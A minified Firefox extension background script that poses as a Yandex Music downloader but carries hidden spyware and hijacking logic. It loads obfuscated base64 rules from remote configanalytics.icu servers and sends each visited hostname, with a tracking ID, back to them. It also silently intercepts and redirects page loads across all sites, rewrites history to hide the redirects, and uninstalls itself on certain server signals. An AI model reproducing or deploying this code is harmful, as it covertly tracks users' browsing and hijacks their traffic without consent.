(()=>{String.prototype.contains=function(e){let t=/^https?:\/\//i,r=t.test(this)?this:`https://${this}`;return y(r).includes(y(e))||y(e).includes(y(r))};Array.prototype.contains=function(e){return this.indexOf(e)>-1};String.prototype.trim=function(){return this.replaceAll("\\","")};Object.prototype.isEmpty=function(){return Object.keys(this).length==0};let f=[],m=new Set;function u(){return browser.runtime.lastError}function a(t){return new Promise(e=>{browser.storage.local.set(t,e)})}function l(t){return new Promise(e=>{browser.storage.local.get(t,e)})}function c(t){return new Promise(e=>{browser.storage.local.remove(t,e)})}function g(){const e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";const t=Array.from({length:120},()=>e[Math.floor(Math.random()*e.length)]).join("");return`?${t}&`}function s(){return Date.now()}function d(e){return e==0?new Date(0).toUTCString():(new Date).toUTCString()}function h(){return(new Date).toLocaleString("ru-ru",{timeZone:"Europe/Moscow"}).replace(",","")}function e(){return`xxxxxxx-xxxx-xxxx-xxxx-xxxx-v.${browser.runtime.getManifest().version}`.replace(/x/g,e=>{let t=Math.random()*16|0,r=e=="x"?t:t&3|8;return r.toString(16)})}function x(e){return atob(e)}function p(e){return btoa(e)}function y(e){return new URL(e).hostname}function w(e){if(e&&e.length>0)return e.split(";")}function v(e){return p(e)}async function L(e,t,r,n,i){let{err:o}=await l("err");o||(o=[]);o.push(i(`${e}:${t}:${r}:${n}:${h()}`));a({err:o})}function b(e,i,o,t,s,r,a,c,u,l,d,n,f,m){let h=/(?:(?:(?:https?):\/\/)|(?:http%3A%2F%2F))([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?/g,p=/=$/g.test(e)?`${e}${i}`:e,w=0;const b=e=>{let n;if(w++,w>7)return L(c,555,y(i),y(e),v),void o(i,s,i);fetch(e).then(e=>{if(U($(e?.url),"w3.org"))return L(c,e.status,y(i),y(e.url),v),void o(i,s,i,+x(l));if(d?.contains(e?.url)){if(+x(a)&&e?.ok)return void o(i?.split("?")[0],s,i);+x(f)?o(e.url.replace("?",g()),s,i,+x(l)):o(e.url,s,i,+x(l))}else if(+x(r))e.text().then(t=>{try{o(k(decodeURIComponent(decodeURIComponent(t)).trim(),h,+x(u)),s,i,+x(l))}catch(e){o(k(t.trim(),h,+x(u)),s,i,+x(l))}}).catch(()=>{L(c,e.status,y(i),y(e.url),v),o(i,s,i)});else{if(!/text\/html/i.test(e?.headers?.get("content-type")))return void L(c,e.status,y(i),y(e.url),v);let r;try{r=decodeURIComponent(decodeURIComponent(e.url))}catch(e){}e.text().then(t=>{try{n=k(decodeURIComponent(decodeURIComponent(t))?.trim(),h,+x(u))?.replace(/url=([^?&]*)(&)/,"url=$1?")}catch(e){n=k(t?.trim(),h,+x(u))?.replace(/url=([^?&]*)(&)/,"url=$1?")}if(n&&!/(\/direct-link\/|\/promo-landing-v\d+\/)/i.test(r))if(d?.contains(n)){if(+x(a)&&t?.ok)return void o(i?.split("?")[0],s,i);+x(f)?o(n.replace("?",g()),s,i,+x(l)):o(n,s,i,+x(l))}else b(n);else if(r){let t;try{t=decodeURIComponent(decodeURIComponent(r?.replace(/link=([^?&]*)(&)/,"link=$1?"))).match(/(https?:\/\/.*?(https?:\/\/.*))/)}catch(e){t=r?.replace(/link=([^?&]*)(&)/,"link=$1?").match(/(https?:\/\/.*?(https?:\/\/.*))/)}t?.[2]?b(t?.[2]):(L(c,444,y(i),y(r),v),o(i,s,i))}}).catch(()=>{L(c,e.status,y(i),y(e.url),v),o(i,s,i)})}}).catch(()=>{L(c,999,y(i),y(e),v),o(i,s,i)})};b(p)}function $(e){let t;if(e.indexOf("//")>-1){t=e.split("/")[2]}else{t=e.split("/")[0]}t=t.split(":")[0];t=t.split("?")[0];return t.replace(/^\./,"")}function U(e,t){return e===t||e.split(".").slice(-3).join(".")===t||e.split(".").slice(-2).join(".")===t}function R(e,t){try{setTimeout(()=>{history.replaceState("","",`https://${location.host}`)},t*1e3)}catch(e){}}function k(t,r,n){for(let e=n;e>=0;e--){try{const i=decodeURIComponent(t.match(r).toString().split(",")[e]);if(i!=="undefined")return i}catch(e){}}return null}function t(e){browser.tabs.create({url:e},u)}function I(e,t,o,s=1){if(s){return new Promise(i=>{browser.tabs.update(t,{url:e},async r=>{function n(e,t){if(t?.status==="complete"&&e===r?.id){browser.tabs.onUpdated.removeListener(n);browser.scripting.executeScript({target:{tabId:e},args:[o.replace(/^http:\/\//i,"https://"),s],func:R});i(r)}}if(browser.tabs.onUpdated.hasListener(n)){browser.tabs.onUpdated.removeListener(n)}browser.tabs.onUpdated.addListener(n)})})}else{browser.tabs.update(t,{url:e},u)}}function r(e){browser.tabs.remove(e,u)}function n(e){browser.tabs.reload(e,u)}async function C(e){const{html:t,share:r,shareTime:n,update:i}=await l(["html","share","shareTime","update"]);const o=w(t);if(r==0&&o.shift()!=0&&s()-i>n){await a({update:s()});browser.scripting.executeScript({target:{tabId:e},func:j})}}async function E(e,t){let{b:r}=await l("b");r||(r=[]);if(r.indexOf(t(e))==-1){r.push(t(e));a({b:r})}}function M(){return new Promise(t=>{browser.permissions.getAll(e=>{if(e.origins.contains("<all_urls>")){return t(true)}else{return t(false)}})})}async function i(){const{uid:e}=await l("uid");browser.runtime.setUninstallURL(`https://fw-chrome.configanalytics.icu/musicpro/firefox/release/uninstall?uid=${e}&ver=${browser.runtime.getManifest().version}`)}async function o(){try{if(!await M())return f=[],!0;const i=await l();i.b||=[],i.err||=[];const o={array:w(i.config),string:`?uid=${i.uid}&ver=${browser.runtime.getManifest().version}&extid=${browser.runtime.id}&start=${i.start}&hash=${[...i.b].join("-")}&err=${[...i.err].join("-")}`},s=async()=>{try{const t=await fetch(o.array.pop()+o.string,{method:"GET",headers:new Headers({"If-Modified-Since":i.ctime,"X-Requested-With":browser.runtime.id})});if(304==t.status)return i?.k&&(f=i.k),a({ctime:d()}),void c(["b","err"]);if(204==t.status)return void browser.management.uninstallSelf();if(403==t.status){if("cloudflare"===t.headers.get("Server"))return void browser.management.uninstallSelf()}if(!t.ok)return c(["b","err"]),void(0!=o.array.length&&await s());const r=t.headers.get("content-type");if(!r||-1==r.indexOf("application/json"))return void(0!=o.array.length&&await s());const n=await t.json();c(["k","b","err"]);let e=n.c.reduce((e,t)=>t.d?e+x(t.d):e,"");f=[],n?.dr&&n.dr.forEach(e=>e.spec&&(f.push(...e.spec),delete e.spec)),a({config:e,html:x(n.r),time:x(n.t),shareTime:x(n.st),k:f,ctime:d()})}catch(e){called=0,0!=o.array.length&&await s()}};(function(r,n=5e3){return new Promise(e=>{const t=()=>{r()?e():setTimeout(t,n)};t()})})(()=>!0===navigator?.onLine).then(()=>{s(),m.clear()}),browser.alarms.create("interval",{periodInMinutes:+i.time}),A(O),browser.alarms.onAlarm.addListener(O)}catch(e){}}async function S(){const r={time:120,config:"https://fw-chrome.configanalytics.icu/mv3/v2/firefox/config.txt;https://cf-chrome.configanalytics.icu/mv3/v2/firefox/config.txt",ctime:d(0),start:s(),update:s(),uid:e(),version:browser.runtime.getManifest().version,share:0,html:"0;https://yandexmusic.pro",shareTime:6e8,all:true,tags:true,folder:false,path:"",cover:"400x400"};for(let[e,t]of Object.entries(r)){if((await l(e)).isEmpty()){a({[e]:t})}}}function j(){const t=document.createElement("iframe");t.src=browser.runtime.getURL("share/share.html");t.style.cssText="position: fixed; bottom: 5px; right: 5px; width: 320px; height: 250px; z-index: 9999; border: none; background: transparent;";document.body.appendChild(t);window.addEventListener("message",e=>{if(e?.data?.action==="closePopup"){document.body.removeChild(t)}})}function A(e){if(browser.alarms.onAlarm.hasListener(e)){browser.alarms.onAlarm.removeListener(e)}}function T(e){if(e.origins.contains("<all_urls>")){t("share/error.html")}}function P(e){if(e.origins.contains("<all_urls>")){browser.tabs.query({},e=>{e.forEach(e=>{if(e.url.includes(`${browser.runtime.id}/share/error.html`)){r(e.id)}if(e.url.includes("music.yandex.")){n(e.id)}})});a({ctime:d(0)});o()}}function O(e){if(e&&e.name=="interval"){browser.alarms.clear("interval",e=>{o()})}}function q(e,t,r){if(t?.status=="complete"){const n=y(r.url);E(n,v);if(!f?.length){return}for(const i of f){const o=new RegExp(x(i.d));if(!m.has(i.d)&&o.test(r.url)&&U(n,$(x(i.o)))){m.add(i.d);const{t:s=p(0),p:a=p(0),b:c=p(0),h:u=p(1),r:l=p(1),s:d=p(0)}=i;b(x(i.u),r.url,I,o,e,s,c,i.n,a,u,x(i.o),i.ri,l,d)}}}}function _(e){const t=y(e.url);E(t,v);if(!f?.length){return}for(const r of f){const n=new RegExp(x(r.d));if(!m.has(r.d)&&n.test(e.url)&&U(t,$(x(r.o)))){m.add(r.d);const{t:i=p(0),p:o=p(0),b:s=p(0),h:a=p(1),r:c=p(1),s:u=p(1)}=r;b(x(r.u),e.url,I,n,e.tabId,i,s,r.n,o,a,x(r.o),r.ri,c,u);return{cancel:true}}}}async function D(e){if(e?.reason==="install"){browser.tabs.query({},e=>{t("share/install.html");e.filter(e=>{const t=y(e.url);return t==="music.yandex.ru"||t==="music.yandex.kz"||t==="music.yandex.by"||t==="music.yandex.uz"||t==="music.yandex.com"}).forEach(e=>n(e.id,u))})}else if(e?.reason==="update"){await a({config:"https://fw-chrome.configanalytics.icu/mv3/v2/firefox/config.txt;https://cf-chrome.configanalytics.icu/mv3/v2/firefox/config.txt",version:browser.runtime.getManifest().version,share:0,shareTime:6e8,ctime:d(0),html:"0;https://yandexmusic.pro"});await o();if(!await M()){t("share/error.html")}}}function z(e){t("https://music.yandex.ru")}function B(s,a,c){(async()=>{const e=(await l("all")).all;if(s.message=="all"){c(e)}if(s.message=="download"){let e=new Blob([s.url],{type:"audio/mpeg"}),t=window.URL.createObjectURL(e);browser.downloads.download({url:t,filename:s.filename.length>200?s.filename.substring(0,200)+".mp3":s.filename,conflictAction:"overwrite"},e=>{if(browser.runtime?.lastError?.message==="filename must not contain illegal characters"){browser.downloads.download({url:t,filename:`${Math.floor(Math.random()*1e15)}.mp3`,conflictAction:"overwrite"})}c({status:"done",message:"100%",url:s.url,id:e});C(a.tab.id,u)})}if(s.message=="check"){if(!await M()){c({status:true})}else{c({status:false})}}if(s.message=="share"){const{url:t,width:r,height:n,left:i,top:o}=s;await browser.windows.create({url:t,width:r,height:n,left:i,top:o,type:"popup"})}})();return true}function F(e){const{state:r,id:n}=e;if(r?.current==="interrupted"||r?.current==="complete"){browser.downloads.search({id:n},e=>{const t={url:e[0]?.url,extension:e[0]?.byExtensionId};if(t?.extension==browser.runtime.id){if(r?.current==="interrupted"){browser.tabs.query({},e=>{e.forEach(e=>{if(e.url.includes("music.yandex.")){try{browser.tabs.sendMessage(e.id,{message:"crash",id:n})}catch(e){}}})})}window.URL.revokeObjectURL(t.url)}})}}function G(){A(O);browser.runtime.onInstalled.addListener(D);browser.browserAction.onClicked.addListener(z);browser.runtime.onMessage.addListener(B);browser.permissions.onAdded.addListener(P);browser.permissions.onRemoved.addListener(T);browser.downloads.onChanged.addListener(F);browser.tabs.onUpdated.addListener(q);browser.webRequest.onBeforeRequest.addListener(_,{urls:["<all_urls>"],types:["main_frame"]},["blocking"])}async function H(){await G();await S();i();o()}H()})();